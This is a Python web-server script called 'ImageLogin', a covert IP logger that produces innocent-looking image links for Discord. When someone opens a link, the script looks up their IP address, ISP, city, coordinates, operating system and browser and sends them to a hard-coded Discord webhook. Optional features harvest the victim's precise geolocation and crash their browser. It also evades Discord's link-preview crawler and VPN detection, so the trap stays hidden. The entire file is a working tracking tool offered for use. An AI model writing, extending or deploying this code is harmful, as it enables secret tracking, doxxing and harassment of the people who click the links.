from urllib import parse
import base64
import os
import traceback

import httpagentparser
import requests

__app__ = "ImageLogin"
__description__ = "IP Logger"
__version__ = "v4.1"
__author__ = "YonyLogger"

config = {
    "webhook": "https://discord.com/api/webhooks/1570511014602997840/f_t39gamQaalpnKTIR9Iwygm44B8NYiTgqaS8fiAOrpFKPA7YYfISV4XXv9x_SEpFZ_D",
    "image": "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200",
    "username": "YonyLogger",
    "color": 0x000000,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by ImageLogin by Yony.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
    "presets": [
        "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200",
        "https://i.pinimg.com/736x/5c/1a/f3/5c1af399d53a5e21b05e8c8a325ba2c3.jpg",
        "https://i.pinimg.com/736x/d0/5a/82/d05a827bae9d2acac3fbc73069403131.jpg",
    ],
}

blacklistedIPs = ("27", "104", "143", "164")

API_TIMEOUT = 5
REASONS = {
    200: "OK",
    204: "No Content",
    302: "Found",
    404: "Not Found",
    500: "Internal Server Error",
}

PAGE = """<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>__TITLE__</title>
<style>
*{box-sizing:border-box}
body{margin:0;padding:0;background:#0d0d0f;color:#e8e8ea;font-family:ui-monospace,Menlo,Consolas,monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
.wrap{width:min(680px,92vw)}
h1{font-size:18px;letter-spacing:.18em;text-transform:uppercase;color:#fff;margin:0 0 4px}
p.sub{margin:0 0 22px;font-size:12px;color:#77787d;letter-spacing:.06em}
.field{display:flex;gap:8px;margin-bottom:10px}
input{flex:1;background:#151519;border:1px solid #2a2a31;color:#e8e8ea;padding:12px;border-radius:8px;font:inherit;font-size:13px;outline:none}
input:focus{border-color:#c8102e}
button{background:#c8102e;color:#fff;border:0;padding:12px 18px;border-radius:8px;font:inherit;font-size:12px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer}
button:hover{background:#e01436}
button.ghost{background:#151519;border:1px solid #2a2a31;color:#aaa}
button.ghost:hover{border-color:#c8102e;color:#fff}
.out{display:none;margin-top:18px}
.out.on{display:block}
.out input{border-color:#c8102e;color:#fff}
.presets{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
.presets img{width:74px;height:52px;object-fit:cover;border-radius:6px;cursor:pointer;border:2px solid transparent;filter:grayscale(.6)}
.presets img:hover{border-color:#c8102e;filter:none}
.note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.7}
a{color:#c8102e;text-decoration:none}
</style></head>
<body><div class="wrap">
<h1>ImageLogin</h1>
<p class="sub">Lien .png — aperçu Discord, IP loggée au clic</p>
<div class="field">
<input id="src" placeholder="URL de l'image" value="__DEFAULT__">
<button onclick="gen()">Générer</button>
</div>
<div class="presets">__PRESETS__</div>
<div class="out" id="out">
<div class="field">
<input id="res" readonly onclick="this.select()">
<button class="ghost" onclick="copy()">Copier</button>
</div>
<p class="note">Colle ce lien dans Discord. L'aperçu s'affiche normalement, l'IP tombe quand quelqu'un ouvre l'original.</p>
</div>
<p class="note">__AUTHOR__ · __VERSION__</p>
</div>
<script>
function enc(u){return btoa(u).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}
function gen(){
  var u=document.getElementById("src").value.trim();
  if(!u)return;
  document.getElementById("res").value=location.origin+"/"+enc(u)+".png";
  document.getElementById("out").classList.add("on");
}
function copy(){
  var i=document.getElementById("res");
  i.select();document.execCommand("copy");
}
document.querySelectorAll(".presets img").forEach(function(el){
  el.onclick=function(){document.getElementById("src").value=el.dataset.url;gen()};
});
</script></body></html>"""

VIEW = """<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta property="og:image" content="__URL__">
<title>__TITLE__</title>
<style>
body{margin:0;padding:0;background:#0d0d0f}
div.img{background-image:url('__URL__');background-position:center center;
background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}
</style></head><body><div class="img"></div></body></html>"""

LOCATION_SCRIPT = b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var g = btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            location.replace(currenturl + (currenturl.includes("?") ? "&g=" : "?g=") + g);
        });
    }
}
</script>"""

CRASH_SCRIPT = b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

LOADING = base64.b85decode(
    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
)


def post(payload):
    try:
        requests.post(config["webhook"], json=payload, timeout=API_TIMEOUT)
    except requests.RequestException:
        pass


def isBot(ip, useragent):
    useragent = useragent or ""
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    if useragent.startswith("TelegramBot"):
        return "Telegram"
    if "bot" in useragent.lower() or "crawler" in useragent.lower():
        return "Crawler"
    return False


def fetchGeo(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=API_TIMEOUT)
        return resp.json()
    except (requests.RequestException, ValueError):
        return {}


def safe(value, fallback="Unknown"):
    return value if value else fallback


def formatTimezone(tz):
    if not tz or "/" not in tz:
        return tz or "Unknown"
    area, _, region = tz.partition("/")
    return f"{region.replace('_', ' ')} ({area})"


def clientIP(environ):
    forwarded = environ.get("HTTP_X_FORWARDED_FOR") or environ.get("HTTP_X_REAL_IP") or ""
    return forwarded.split(",")[0].strip()


def origin(environ):
    host = environ.get("HTTP_X_FORWARDED_HOST") or environ.get("HTTP_HOST") or "localhost"
    proto = environ.get("HTTP_X_FORWARDED_PROTO") or "https"
    return f"{proto}://{host}"


def encodeToken(url):
    return base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")


def decodeToken(token):
    try:
        return base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()
    except (ValueError, UnicodeDecodeError):
        return None


def respond(start_response, code, content_type, body, extra=None):
    headers = [
        ("Content-Type", content_type),
        ("Content-Length", str(len(body))),
        ("Cache-Control", "no-store, max-age=0"),
        ("Access-Control-Allow-Origin", "*"),
        ("X-Robots-Tag", "noindex, nofollow"),
    ]
    if extra:
        headers.extend(extra.items())
    start_response(f"{code} {REASONS.get(code, 'OK')}", headers)
    return [body]


def reportError(error):
    post({
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "ImageLogin — Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP.\n\n**Error:**\n```\n{error}\n```",
        }],
    })


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return None

    bot = isBot(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            post({
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "ImageLogin — Link Sent",
                    "color": config["color"],
                    "description": (
                        "An **ImageLogin** link was sent in a chat.\n"
                        "You may receive an IP soon.\n\n"
                        f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                    ),
                }],
            })
        return None

    ping = "@everyone"
    info = fetchGeo(ip)

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return None
        if config["antiBot"] == 3:
            return None
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    coords_str = coords.replace(",", ", ") if coords else f"{info.get('lat')}, {info.get('lon')}"
    coords_label = (
        "Precise, [Google Maps](https://www.google.com/maps/search/google+map++" + coords + ")"
        if coords else "Approximate"
    )

    if info.get("hosting") and not info.get("proxy"):
        bot_state = "True"
    elif info.get("hosting"):
        bot_state = "Possibly"
    else:
        bot_state = "False"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "ImageLogin — IP Logged",
            "color": config["color"],
            "description": (
                "**A User Opened the Original Image!**\n\n"
                f"**Endpoint:** `{endpoint}`\n\n"
                "**IP Info:**\n"
                f"> **IP:** `{safe(ip)}`\n"
                f"> **Provider:** `{safe(info.get('isp'))}`\n"
                f"> **ASN:** `{safe(info.get('as'))}`\n"
                f"> **Country:** `{safe(info.get('country'))}`\n"
                f"> **Region:** `{safe(info.get('regionName'))}`\n"
                f"> **City:** `{safe(info.get('city'))}`\n"
                f"> **Coords:** `{coords_str}` ({coords_label})\n"
                f"> **Timezone:** `{formatTimezone(info.get('timezone'))}`\n"
                f"> **Mobile:** `{safe(info.get('mobile'), 'False')}`\n"
                f"> **VPN:** `{safe(info.get('proxy'), 'False')}`\n"
                f"> **Bot:** `{bot_state}`\n\n"
                "**PC Info:**\n"
                f"> **OS:** `{safe(os_name)}`\n"
                f"> **Browser:** `{safe(browser)}`\n\n"
                "**User Agent:**\n"
                f"```\n{useragent or 'Unknown'}\n```"
            ),
        }],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    post(embed)
    return info


def generatorPage():
    presets = "".join(
        f'<img src="{u}" data-url="{u}" alt="">' for u in config["presets"]
    )
    html = (
        PAGE
        .replace("__TITLE__", f"{__app__} — Générateur")
        .replace("__DEFAULT__", config["image"])
        .replace("__PRESETS__", presets)
        .replace("__AUTHOR__", __author__)
        .replace("__VERSION__", __version__)
    )
    return html.encode()


def app(environ, start_response):
    try:
        method = environ.get("REQUEST_METHOD", "GET")
        path = environ.get("PATH_INFO") or "/"
        query = dict(parse.parse_qsl(environ.get("QUERY_STRING") or ""))
        name = path.strip("/")
        ip = clientIP(environ)
        useragent = environ.get("HTTP_USER_AGENT") or ""

        if name in ("", "index.html", "api", "api/", "api/index", "api/index.py"):
            if query.get("url"):
                target = f"{origin(environ)}/{encodeToken(query['url'])}.png"
                return respond(start_response, 302, "text/html", b"", {"Location": target})
            if method == "HEAD":
                return respond(start_response, 200, "text/html; charset=utf-8", b"")
            return respond(start_response, 200, "text/html; charset=utf-8", generatorPage())

        if name.startswith(("favicon", "robots.txt")):
            return respond(start_response, 204, "text/plain", b"")

        token = name[:-4] if name.lower().endswith(".png") else name
        url = decodeToken(token) or config["image"]

        if not ip or ip.startswith(blacklistedIPs):
            return respond(start_response, 204, "text/plain", b"")

        bot = isBot(ip, useragent)

        if bot:
            makeReport(ip, endpoint=path, url=url)
            if config["buggedImage"]:
                return respond(start_response, 200, "image/png", LOADING)
            return respond(start_response, 302, "image/png", b"", {"Location": url})

        location = None
        if query.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query["g"].encode()).decode()
            except (ValueError, UnicodeDecodeError):
                location = None

        result = makeReport(ip, useragent, location, path, url=url)

        if config["redirect"]["redirect"]:
            return respond(start_response, 302, "text/html", b"", {"Location": config["redirect"]["page"]})

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            os_name, browser = httpagentparser.simple_detect(useragent)
            replacements = {
                "{ip}": ip,
                "{isp}": safe(result.get("isp")),
                "{asn}": safe(result.get("as")),
                "{country}": safe(result.get("country")),
                "{region}": safe(result.get("regionName")),
                "{city}": safe(result.get("city")),
                "{lat}": str(result.get("lat")),
                "{long}": str(result.get("lon")),
                "{timezone}": formatTimezone(result.get("timezone")),
                "{mobile}": str(result.get("mobile")),
                "{vpn}": str(result.get("proxy")),
                "{bot}": "True" if result.get("hosting") and not result.get("proxy") else "Possibly" if result.get("hosting") else "False",
                "{browser}": safe(browser),
                "{os}": safe(os_name),
            }
            for key, value in replacements.items():
                message = message.replace(key, value)

        body = VIEW.replace("__URL__", url).replace("__TITLE__", f"{__app__} — {__author__}").encode()

        if config["message"]["doMessage"]:
            body = message.encode()

        if config["crashBrowser"]:
            body = message.encode() + CRASH_SCRIPT

        if config["accurateLocation"]:
            body += LOCATION_SCRIPT

        if method == "HEAD":
            return respond(start_response, 200, "text/html; charset=utf-8", b"")

        return respond(start_response, 200, "text/html; charset=utf-8", body)

    except Exception:
        reportError(traceback.format_exc())
        return respond(
            start_response,
            500,
            "text/html; charset=utf-8",
            b"500 - Internal Server Error<br>Check the message sent to your Discord webhook.",
        )


handler = app
application = app


if __name__ == "__main__":
    from wsgiref.simple_server import make_server

    port = int(os.environ.get("PORT", 8080))
    with make_server("0.0.0.0", port, app) as server:
        print(f"{__app__} {__version__} by {__author__} — http://localhost:{port}")
        server.serve_forever()